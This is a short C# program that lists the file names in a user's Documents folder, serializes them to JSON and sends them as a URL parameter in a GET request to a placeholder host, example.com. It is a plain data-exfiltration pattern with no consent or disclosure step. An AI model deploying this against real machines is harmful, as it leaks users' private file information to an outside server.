using System;
using System.IO;
using System.Net;
using Newtonsoft.Json;

class Program
{
    static void Main(string[] args)
    {
        // Specify the directory path to map
        string path = @"C:\Users\Username\Documents";

        // Get all file names in the directory
        string[] fileNames = Directory.GetFiles(path);

        // Create a JSON object with the file names
        string json = JsonConvert.SerializeObject(fileNames);

        // Add the JSON object as a parameter to a URL
        string url = "http://example.com?p=" + json;

        // Send a GET request to the URL
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        request.Method = "GET";
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        StreamReader reader = new StreamReader(response.GetResponseStream());
        string responseText = reader.ReadToEnd();
        Console.WriteLine(responseText);
    }
}
